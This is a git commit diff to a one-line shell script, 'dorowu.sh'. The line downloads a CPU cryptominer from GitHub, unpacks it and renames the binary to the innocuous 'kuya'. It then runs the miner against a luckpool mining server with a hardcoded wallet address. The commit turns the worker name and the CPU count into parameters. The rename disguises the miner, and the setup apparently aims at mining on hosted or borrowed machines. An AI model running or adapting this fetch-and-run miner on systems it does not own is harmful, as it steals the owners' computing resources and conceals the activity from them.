1bb8f44fe520bc03f50ae4d266a8e1c0fc83c886
hanifgz <91132543+hanifgz@users.noreply.github.com>
2021-12-16 05:28:52 +0700

    Update dorowu.sh

--- dorowu.sh
+++ dorowu.sh
@@ -1,1 +1,1 @@
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz;tar xf hellminer_cpu_linux.tar.gz;mv hellminer kuya;./kuya -c stratum+tcp://ap.luckpool.net:3956 -u RKJZtNARyonv8N2GtPAo5E7sn8uHPjt2LZ.qwik -p x --cpu $1
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz;tar xf hellminer_cpu_linux.tar.gz;mv hellminer kuya;./kuya -c stratum+tcp://ap.luckpool.net:3956 -u RKJZtNARyonv8N2GtPAo5E7sn8uHPjt2LZ.$1 -p x --cpu $2
